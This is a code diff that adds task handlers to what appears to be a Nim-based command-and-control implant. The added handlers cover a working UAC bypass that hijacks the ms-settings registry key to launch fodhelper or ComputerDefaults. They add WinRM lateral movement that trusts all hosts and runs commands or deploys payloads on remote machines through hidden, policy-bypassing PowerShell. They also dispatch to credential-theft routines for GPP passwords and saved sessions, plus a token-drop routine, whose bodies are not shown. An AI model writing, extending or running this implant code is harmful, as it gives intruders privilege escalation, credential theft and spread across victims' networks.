@@ -2163,5 +2163,91 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       startMemFluctuate(intervalSec)
       t.sendResult(id, "[+] memory scrambler started (interval " & $intervalSec & "s)", "")
 
+  of "REV2SELF":
+    when defined(windows): t.sendResult(id, doTokenDrop(), "")
+    else: t.sendResult(id, "", "REV2SELF: not supported on Linux")
+
+  of "GPP_PASSWORDS":
+    when defined(windows): t.sendResult(id, doGppHunt(), "")
+    else: t.sendResult(id, "", "GPP_PASSWORDS: not supported on Linux")
+
+  of "SESSION_CREDS":
+    when defined(windows): t.sendResult(id, doSessionGopher(), "")
+    else: t.sendResult(id, "", "SESSION_CREDS: not supported on Linux")
+
+  of "ELEVATE":
+    when defined(windows):
+      try:
+        let parts2 = args.strip().splitWhitespace(maxsplit = 1)
+        let meth2 = if parts2.len >= 1: parts2[0].toLowerAscii() else: "fodhelper"
+        let cmd2  = if parts2.len >= 2: parts2[1] else: getAppFilename()
+        let regPath = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
+        discard runShell("reg add \"" & regPath & "\" /ve /t REG_SZ /d \"" & cmd2 & "\" /f")
+        discard runShell("reg add \"" & regPath & "\" /v \"DelegateExecute\" /t REG_SZ /d \"\" /f")
+        let exe2 = if meth2 == "computerdefaults":
+                     "C:\\Windows\\System32\\ComputerDefaults.exe"
+                   else: "fodhelper.exe"
+        let out2b = runShell("start " & exe2)
+        Sleep(DWORD(2000))
+        discard runShell("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f")
+        t.sendResult(id, "[+] UAC bypass (" & meth2 & ") triggered: " & cmd2 & "\n" & out2b, "")
+      except: t.sendResult(id, "", "elevate: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "ELEVATE: not supported on Linux")
+
+  of "WINRM_EXEC":
+    when defined(windows):
+      try:
+        let j = parseJson(args)
+        let target2 = j{"target"}.getStr()
+        let user2   = j{"user"}.getStr()
+        let pass2   = j{"pass"}.getStr()
+        let cmd3    = j{"cmd"}.getStr()
+        if target2 == "" or cmd3 == "":
+          t.sendResult(id, "", "WINRM_EXEC: {\"target\",\"user\",\"pass\",\"cmd\"} required"); return
+        let addTrust2 = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
+          "try{$ip=([System.Net.Dns]::GetHostAddresses('" & target2 &
+          "')|Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
+          "catch{$ip='" & target2 & "'};"
+        let ps2 = addTrust2 &
+          "$c=New-Object PSCredential('" & user2 & "',(ConvertTo-SecureString '" & pass2 &
+          "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication NTLM" &
+          " -Credential $c -ScriptBlock {" & cmd3 & "}"
+        t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
+          ps2.replace("\"", "\\\"") & "\""), "")
+      except: t.sendResult(id, "", "winrm_exec: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "WINRM_EXEC: not supported on Linux")
+
+  of "WINRM_DEPLOY":
+    when defined(windows):
+      try:
+        let j = parseJson(args)
+        let target3  = j{"target"}.getStr()
+        let user3    = j{"user"}.getStr()
+        let pass3    = j{"pass"}.getStr()
+        let payload2 = j{"payload"}.getStr()
+        if target3 == "" or payload2 == "":
+          t.sendResult(id, "", "WINRM_DEPLOY: {\"target\",\"user\",\"pass\",\"payload\"} required"); return
+        let addTrust3 = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
+          "try{$ip=([System.Net.Dns]::GetHostAddresses('" & target3 &
+          "')|Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
+          "catch{$ip='" & target3 & "'};"
+        let ps3 = addTrust3 &
+          "$c=New-Object PSCredential('" & user3 & "',(ConvertTo-SecureString '" & pass3 &
+          "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication NTLM" &
+          " -Credential $c -AsJob -ScriptBlock {" & payload2 & "} | Out-Null"
+        t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
+          ps3.replace("\"", "\\\"") & "\""), "")
+      except: t.sendResult(id, "", "winrm_deploy: " & getCurrentExceptionMsg())
+    else:
+      t.sendResult(id, "", "WINRM_DEPLOY: not supported on Linux")
+
+  of "PIPE_START":
+    t.sendResult(id, "", "PIPE_START: not yet implemented in Nim agent")
+
+  of "PIPE_STOP":
+    t.sendResult(id, "", "PIPE_STOP: not yet implemented in Nim agent")
+
   else:
     t.sendResult(id, "", "unknown task type: " & typ)
